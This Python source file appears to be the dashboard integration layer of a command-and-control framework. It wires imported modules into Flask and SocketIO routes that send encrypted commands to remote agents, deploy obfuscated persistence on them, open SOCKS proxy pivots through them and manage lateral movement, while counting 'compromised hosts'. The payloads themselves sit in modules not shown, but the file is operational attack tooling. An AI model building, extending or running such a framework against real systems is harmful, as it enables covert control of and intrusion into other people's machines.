"""
Advanced Dashboard Integration Module
Integrates all advanced features into the C2 dashboard with real-time analytics and ML insights
"""

import json
import time
from datetime import datetime, timedelta
from collections import defaultdict, deque
import threading
import queue

# Import advanced modules
try:
    from advanced_ai_detection import AdvancedThreatDetector, init_threat_detector
    AI_AVAILABLE = True
except ImportError:
    AI_AVAILABLE = False
    print("[DASHBOARD] AI detection module not available")

try:
    from advanced_crypto_channel import AdvancedCryptoChannel, SecureMessageProtocol
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    print("[DASHBOARD] Crypto channel module not available")

try:
    from advanced_persistence import AdvancedPersistenceManager
    PERSISTENCE_AVAILABLE = True
except ImportError:
    PERSISTENCE_AVAILABLE = False
    print("[DASHBOARD] Persistence module not available")

try:
    from advanced_network_pivoting import AdvancedNetworkPivot, LateralMovementManager
    PIVOT_AVAILABLE = True
except ImportError:
    PIVOT_AVAILABLE = False
    print("[DASHBOARD] Network pivoting module not available")


class AdvancedDashboardIntegration:
    """
    Integration layer for advanced features with real-time analytics
    """
    
    def __init__(self, socketio=None):
        self.socketio = socketio
        
        # Initialize advanced modules
        self.threat_detector = None
        self.crypto_channels = {}
        self.persistence_managers = {}
        self.network_pivots = {}
        self.lateral_movement = None
        
        # Analytics data
        self.analytics = {
            'threats': deque(maxlen=1000),
            'commands': deque(maxlen=1000),
            'network_activity': deque(maxlen=1000),
            'agent_health': defaultdict(dict)
        }
        
        # Real-time metrics
        self.metrics = {
            'total_threats_detected': 0,
            'high_risk_actions': 0,
            'encrypted_messages': 0,
            'active_pivots': 0,
            'compromised_hosts': 0
        }
        
        # Background analytics thread
        self.analytics_active = True
        self.analytics_thread = threading.Thread(target=self._analytics_loop, daemon=True)
        self.analytics_thread.start()
        
        print("[DASHBOARD] Advanced integration initialized")
    
    def initialize_modules(self):
        """Initialize all available advanced modules"""
        results = {}
        
        # AI Threat Detection
        if AI_AVAILABLE:
            try:
                self.threat_detector = init_threat_detector(sensitivity='medium')
                results['threat_detection'] = {'status': 'active', 'sensitivity': 'medium'}
            except Exception as e:
                results['threat_detection'] = {'status': 'error', 'error': str(e)}
        else:
            results['threat_detection'] = {'status': 'unavailable'}
        
        # Lateral Movement
        if PIVOT_AVAILABLE:
            try:
                self.lateral_movement = LateralMovementManager()
                results['lateral_movement'] = {'status': 'active'}
            except Exception as e:
                results['lateral_movement'] = {'status': 'error', 'error': str(e)}
        else:
            results['lateral_movement'] = {'status': 'unavailable'}
        
        return results
    
    def analyze_agent_action(self, agent_id, action_data):
        """
        Analyze agent action with AI threat detection
        
        Returns threat assessment and recommendations
        """
        if not AI_AVAILABLE or not self.threat_detector:
            return {'status': 'unavailable'}
        
        try:
            # Analyze with threat detector
            assessment = self.threat_detector.analyze_agent_behavior(agent_id, action_data)
            
            # Update metrics
            self.metrics['total_threats_detected'] += 1
            if assessment['risk_score'] >= 70:
                self.metrics['high_risk_actions'] += 1
            
            # Store in analytics
            self.analytics['threats'].append({
                'timestamp': datetime.now().isoformat(),
                'agent_id': agent_id,
                'risk_score': assessment['risk_score'],
                'threat_level': assessment['threat_level']
            })
            
            # Emit to dashboard if high risk
            if self.socketio and assessment['risk_score'] >= 60:
                self.socketio.emit('threat_alert', {
                    'agent_id': agent_id,
                    'assessment': assessment
                })
            
            return assessment
            
        except Exception as e:
            return {'status': 'error', 'error': str(e)}
    
    def establish_encrypted_channel(self, agent_id):
        """Establish encrypted channel with agent"""
        if not CRYPTO_AVAILABLE:
            return {'success': False, 'error': 'Crypto module unavailable'}
        
        try:
            # Create crypto channel for this agent
            channel = AdvancedCryptoChannel(role='controller', key_rotation_interval=3600)
            self.crypto_channels[agent_id] = channel
            
            # Get public key for exchange
            public_key = channel.get_public_key_bytes()
            
            return {
                'success': True,
                'agent_id': agent_id,
                'public_key': public_key.decode('utf-8'),
                'algorithm': 'ChaCha20-Poly1305',
                'key_exchange': 'ECDH-P384'
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def send_encrypted_command(self, agent_id, command):
        """Send encrypted command to agent"""
        if agent_id not in self.crypto_channels:
            return {'success': False, 'error': 'No encrypted channel established'}
        
        try:
            channel = self.crypto_channels[agent_id]
            encrypted = channel.encrypt_message(command, agent_id)
            
            self.metrics['encrypted_messages'] += 1
            
            return {
                'success': True,
                'encrypted_package': encrypted
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def deploy_persistence(self, agent_id, payload_path=None):
        """Deploy persistence mechanisms on agent"""
        if not PERSISTENCE_AVAILABLE:
            return {'success': False, 'error': 'Persistence module unavailable'}
        
        try:
            # Create persistence manager for agent
            manager = AdvancedPersistenceManager(payload_path=payload_path, obfuscate=True)
            self.persistence_managers[agent_id] = manager
            
            # Install all available methods
            results = manager.install_all_methods()
            
            return {
                'success': True,
                'agent_id': agent_id,
                'results': results
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def create_network_pivot(self, agent_id, bind_address='127.0.0.1', bind_port=1080):
        """Create network pivot through agent"""
        if not PIVOT_AVAILABLE:
            return {'success': False, 'error': 'Pivot module unavailable'}
        
        try:
            # Create pivot for agent
            pivot = AdvancedNetworkPivot(bind_address=bind_address, bind_port=bind_port)
            result = pivot.start_socks_proxy()
            
            if result['success']:
                self.network_pivots[agent_id] = pivot
                self.metrics['active_pivots'] += 1
                
                return {
                    'success': True,
                    'agent_id': agent_id,
                    'pivot_info': result
                }
            else:
                return result
                
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def get_agent_risk_profile(self, agent_id):
        """Get comprehensive risk profile for agent"""
        if not AI_AVAILABLE or not self.threat_detector:
            return {'status': 'unavailable'}
        
        try:
            profile = self.threat_detector.get_agent_risk_profile(agent_id)
            return profile
        except Exception as e:
            return {'error': str(e)}
    
    def get_real_time_analytics(self):
        """Get real-time analytics dashboard data"""
        # Recent threat activity
        recent_threats = list(self.analytics['threats'])[-20:]
        
        # Calculate threat trends
        if recent_threats:
            avg_risk = sum(t['risk_score'] for t in recent_threats) / len(recent_threats)
            high_risk_count = sum(1 for t in recent_threats if t['risk_score'] >= 70)
        else:
            avg_risk = 0
            high_risk_count = 0
        
        # Active modules status
        modules_status = {
            'threat_detection': AI_AVAILABLE and self.threat_detector is not None,
            'encryption': CRYPTO_AVAILABLE and len(self.crypto_channels) > 0,
            'persistence': PERSISTENCE_AVAILABLE and len(self.persistence_managers) > 0,
            'pivoting': PIVOT_AVAILABLE and len(self.network_pivots) > 0
        }
        
        return {
            'timestamp': datetime.now().isoformat(),
            'metrics': self.metrics,
            'recent_threats': recent_threats,
            'threat_trends': {
                'average_risk_score': round(avg_risk, 2),
                'high_risk_count': high_risk_count,
                'total_analyzed': len(list(self.analytics['threats']))
            },
            'modules_status': modules_status,
            'active_channels': {
                'encrypted': len(self.crypto_channels),
                'pivots': len(self.network_pivots),
                'persistence': len(self.persistence_managers)
            }
        }
    
    def get_ml_insights(self):
        """Get machine learning insights from threat data"""
        if not AI_AVAILABLE or not self.threat_detector:
            return {'status': 'unavailable'}
        
        try:
            # Analyze patterns in threat data
            threats = list(self.analytics['threats'])
            
            if len(threats) < 10:
                return {'status': 'insufficient_data'}
            
            # Calculate insights
            risk_scores = [t['risk_score'] for t in threats]
            
            insights = {
                'threat_distribution': {
                    'minimal': sum(1 for s in risk_scores if s < 20),
                    'low': sum(1 for s in risk_scores if 20 <= s < 40),
                    'medium': sum(1 for s in risk_scores if 40 <= s < 60),
                    'high': sum(1 for s in risk_scores if 60 <= s < 80),
                    'critical': sum(1 for s in risk_scores if s >= 80)
                },
                'statistics': {
                    'mean_risk': round(sum(risk_scores) / len(risk_scores), 2),
                    'max_risk': max(risk_scores),
                    'min_risk': min(risk_scores)
                },
                'top_risky_agents': self._get_top_risky_agents(threats)
            }
            
            return insights
            
        except Exception as e:
            return {'error': str(e)}
    
    def _get_top_risky_agents(self, threats, top_n=5):
        """Get top risky agents from threat data"""
        agent_risks = defaultdict(list)
        
        for threat in threats:
            agent_risks[threat['agent_id']].append(threat['risk_score'])
        
        # Calculate average risk per agent
        agent_avg_risks = {
            agent_id: sum(scores) / len(scores)
            for agent_id, scores in agent_risks.items()
        }
        
        # Sort by risk
        sorted_agents = sorted(
            agent_avg_risks.items(),
            key=lambda x: x[1],
            reverse=True
        )
        
        return [
            {'agent_id': agent_id, 'avg_risk': round(risk, 2)}
            for agent_id, risk in sorted_agents[:top_n]
        ]
    
    def export_threat_intelligence(self, filepath='threat_intelligence.json'):
        """Export comprehensive threat intelligence"""
        if not AI_AVAILABLE or not self.threat_detector:
            return {'success': False, 'error': 'AI module unavailable'}
        
        try:
            self.threat_detector.export_threat_intelligence(filepath)
            return {'success': True, 'filepath': filepath}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _analytics_loop(self):
        """Background analytics processing"""
        while self.analytics_active:
            try:
                # Update health metrics
                for agent_id in list(self.crypto_channels.keys()):
                    if agent_id in self.crypto_channels:
                        channel = self.crypto_channels[agent_id]
                        session_info = channel.get_session_info()
                        
                        self.analytics['agent_health'][agent_id] = {
                            'encryption_status': session_info.get('status'),
                            'last_update': datetime.now().isoformat()
                        }
                
                # Update pivot metrics
                self.metrics['active_pivots'] = len([
                    p for p in self.network_pivots.values()
                    if p.active
                ])
                
                # Emit analytics update to dashboard
                if self.socketio:
                    analytics = self.get_real_time_analytics()
                    self.socketio.emit('analytics_update', analytics)
                
                time.sleep(5)  # Update every 5 seconds
                
            except Exception as e:
                print(f"[DASHBOARD] Analytics loop error: {e}")
    
    def get_dashboard_config(self):
        """Get configuration for dashboard UI"""
        return {
            'features': {
                'ai_threat_detection': AI_AVAILABLE,
                'encrypted_channels': CRYPTO_AVAILABLE,
                'persistence_deployment': PERSISTENCE_AVAILABLE,
                'network_pivoting': PIVOT_AVAILABLE
            },
            'analytics_enabled': True,
            'real_time_updates': True,
            'ml_insights_available': AI_AVAILABLE
        }
    
    def shutdown(self):
        """Gracefully shutdown all advanced modules"""
        self.analytics_active = False
        
        # Shutdown threat detector
        if self.threat_detector:
            self.threat_detector.shutdown()
        
        # Shutdown crypto channels
        for channel in self.crypto_channels.values():
            channel.shutdown()
        
        # Shutdown pivots
        for pivot in self.network_pivots.values():
            pivot.stop_all()
        
        # Wait for analytics thread
        self.analytics_thread.join(timeout=2)
        
        print("[DASHBOARD] Advanced integration shutdown complete")


# Flask/SocketIO route handlers for advanced features
def register_advanced_routes(app, socketio, dashboard_integration):
    """Register advanced feature routes with Flask app"""
    
    @app.route('/api/advanced/analytics')
    def get_advanced_analytics():
        """Get real-time analytics"""
        from flask import jsonify
        return jsonify(dashboard_integration.get_real_time_analytics())
    
    @app.route('/api/advanced/ml-insights')
    def get_ml_insights():
        """Get ML-powered insights"""
        from flask import jsonify
        return jsonify(dashboard_integration.get_ml_insights())
    
    @app.route('/api/advanced/agent/<agent_id>/risk-profile')
    def get_agent_risk(agent_id):
        """Get agent risk profile"""
        from flask import jsonify
        return jsonify(dashboard_integration.get_agent_risk_profile(agent_id))
    
    @app.route('/api/advanced/threat-intelligence/export')
    def export_intelligence():
        """Export threat intelligence"""
        from flask import jsonify
        result = dashboard_integration.export_threat_intelligence()
        return jsonify(result)
    
    # SocketIO events
    @socketio.on('analyze_action')
    def handle_analyze_action(data):
        """Analyze agent action"""
        agent_id = data.get('agent_id')
        action = data.get('action')
        
        result = dashboard_integration.analyze_agent_action(agent_id, action)
        socketio.emit('action_analysis', result)
    
    @socketio.on('establish_encryption')
    def handle_establish_encryption(data):
        """Establish encrypted channel"""
        agent_id = data.get('agent_id')
        
        result = dashboard_integration.establish_encrypted_channel(agent_id)
        socketio.emit('encryption_established', result)
    
    @socketio.on('deploy_persistence')
    def handle_deploy_persistence(data):
        """Deploy persistence"""
        agent_id = data.get('agent_id')
        payload_path = data.get('payload_path')
        
        result = dashboard_integration.deploy_persistence(agent_id, payload_path)
        socketio.emit('persistence_deployed', result)
    
    @socketio.on('create_pivot')
    def handle_create_pivot(data):
        """Create network pivot"""
        agent_id = data.get('agent_id')
        bind_address = data.get('bind_address', '127.0.0.1')
        bind_port = data.get('bind_port', 1080)
        
        result = dashboard_integration.create_network_pivot(agent_id, bind_address, bind_port)
        socketio.emit('pivot_created', result)
    
    print("[DASHBOARD] Advanced routes registered")


if __name__ == '__main__':
    # Test dashboard integration
    print("Testing Advanced Dashboard Integration\n")
    
    integration = AdvancedDashboardIntegration()
    
    # Initialize modules
    init_results = integration.initialize_modules()
    print(f"Module Initialization: {json.dumps(init_results, indent=2)}\n")
    
    # Test threat analysis
    test_action = {
        'type': 'command',
        'command': 'whoami',
        'resource': 'system',
        'cpu_usage': 5,
        'memory_usage': 10,
        'privilege': 'user'
    }
    
    assessment = integration.analyze_agent_action('test_agent', test_action)
    print(f"Threat Assessment: {json.dumps(assessment, indent=2)}\n")
    
    # Get analytics
    time.sleep(1)
    analytics = integration.get_real_time_analytics()
    print(f"Analytics: {json.dumps(analytics, indent=2)}\n")
    
    # Get ML insights
    insights = integration.get_ml_insights()
    print(f"ML Insights: {json.dumps(insights, indent=2)}\n")
    
    # Get config
    config = integration.get_dashboard_config()
    print(f"Dashboard Config: {json.dumps(config, indent=2)}\n")
    
    time.sleep(2)
    
    # Cleanup
    integration.shutdown()
